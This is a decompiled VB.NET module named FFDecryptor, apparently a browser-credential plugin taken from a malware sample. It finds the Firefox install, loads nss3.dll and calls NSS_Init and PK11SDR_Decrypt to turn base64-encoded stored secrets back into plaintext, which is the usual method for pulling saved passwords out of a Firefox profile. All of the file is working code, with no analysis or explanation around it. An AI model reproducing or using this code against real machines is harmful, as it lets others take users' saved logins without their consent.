Imports System
Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Text

Namespace Plugin.Browsers.Firefox
	' Token: 0x02000010 RID: 16
	Friend Module FFDecryptor
		' Token: 0x0600007B RID: 123
		Public Declare Function LoadLibrary Lib "kernel32.dll" (dllFilePath As String) As IntPtr

		' Token: 0x0600007C RID: 124
		Public Declare Ansi Function GetProcAddress Lib "kernel32" (hModule As IntPtr, procName As String) As IntPtr

		' Token: 0x0600007D RID: 125 RVA: 0x00005A68 File Offset: 0x00003C68
		Public Function NSS_Init(configdir As String) As Long
			Dim flag As Boolean = Directory.Exists("C:\Program Files\Mozilla Firefox")
			Dim str As String
			If flag Then
				str = "C:\Program Files\Mozilla Firefox\"
			Else
				Dim flag2 As Boolean = Directory.Exists("C:\Program Files (x86)\Mozilla Firefox")
				If flag2 Then
					str = "C:\Program Files (x86)\Mozilla Firefox\"
				Else
					str = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\Mozilla Firefox\"
				End If
			End If
			FFDecryptor.LoadLibrary(str + "mozglue.dll")
			FFDecryptor.NSS3 = FFDecryptor.LoadLibrary(str + "nss3.dll")
			Return CType(Marshal.GetDelegateForFunctionPointer(FFDecryptor.GetProcAddress(FFDecryptor.NSS3, "NSS_Init"), GetType(FFDecryptor.DLLFunctionDelegate)), FFDecryptor.DLLFunctionDelegate)(configdir)
		End Function

		' Token: 0x0600007E RID: 126 RVA: 0x00005B10 File Offset: 0x00003D10
		Public Function Decrypt(cypherText As String) As String
			Dim ffDataUnmanagedPointer As IntPtr = IntPtr.Zero
			Dim sb As StringBuilder = New StringBuilder(cypherText)
			Try
				Dim ffData As Byte() = Convert.FromBase64String(cypherText)
				ffDataUnmanagedPointer = Marshal.AllocHGlobal(ffData.Length)
				Marshal.Copy(ffData, 0, ffDataUnmanagedPointer, ffData.Length)
				Dim tSecDec As FFDecryptor.TSECItem = Nothing
				Dim item As FFDecryptor.TSECItem = Nothing
				item.SECItemType = 0
				item.SECItemData = ffDataUnmanagedPointer
				item.SECItemLen = ffData.Length
				Dim flag As Boolean = FFDecryptor.PK11SDR_Decrypt(item, tSecDec, 0) = 0
				If flag Then
					Dim flag2 As Boolean = tSecDec.SECItemLen <> 0
					If flag2 Then
						Dim bvRet As Byte() = New Byte(tSecDec.SECItemLen - 1) {}
						Marshal.Copy(tSecDec.SECItemData, bvRet, 0, tSecDec.SECItemLen)
						Return Encoding.ASCII.GetString(bvRet)
					End If
				End If
			Catch
				Return Nothing
			Finally
				Dim flag3 As Boolean = ffDataUnmanagedPointer <> IntPtr.Zero
				If flag3 Then
					Marshal.FreeHGlobal(ffDataUnmanagedPointer)
				End If
			End Try
			Return Nothing
		End Function

		' Token: 0x0600007F RID: 127 RVA: 0x00005C18 File Offset: 0x00003E18
		Public Function PK11SDR_Decrypt(ByRef data As FFDecryptor.TSECItem, ByRef result As FFDecryptor.TSECItem, cx As Integer) As Integer
			Dim pProc As IntPtr = FFDecryptor.GetProcAddress(FFDecryptor.NSS3, "PK11SDR_Decrypt")
			Dim dll As FFDecryptor.DLLFunctionDelegate5 = CType(Marshal.GetDelegateForFunctionPointer(pProc, GetType(FFDecryptor.DLLFunctionDelegate5)), FFDecryptor.DLLFunctionDelegate5)
			Return dll(data, result, cx)
		End Function

		' Token: 0x04000030 RID: 48
		Private NSS3 As IntPtr

		' Token: 0x0200001C RID: 28
		' (Invoke) Token: 0x060000A1 RID: 161
		<UnmanagedFunctionPointer(CallingConvention.Cdecl)>
		Public Delegate Function DLLFunctionDelegate(configdir As String) As Long

		' Token: 0x0200001D RID: 29
		' (Invoke) Token: 0x060000A5 RID: 165
		<UnmanagedFunctionPointer(CallingConvention.Cdecl)>
		Public Delegate Function DLLFunctionDelegate4(arenaOpt As IntPtr, outItemOpt As IntPtr, inStr As StringBuilder, inLen As Integer) As Integer

		' Token: 0x0200001E RID: 30
		' (Invoke) Token: 0x060000A9 RID: 169
		<UnmanagedFunctionPointer(CallingConvention.Cdecl)>
		Public Delegate Function DLLFunctionDelegate5(ByRef data As FFDecryptor.TSECItem, ByRef result As FFDecryptor.TSECItem, cx As Integer) As Integer

		' Token: 0x0200001F RID: 31
		Public Structure TSECItem
			' Token: 0x04000042 RID: 66
			Public SECItemType As Integer

			' Token: 0x04000043 RID: 67
			Public SECItemData As IntPtr

			' Token: 0x04000044 RID: 68
			Public SECItemLen As Integer
		End Structure
	End Module
End Namespace
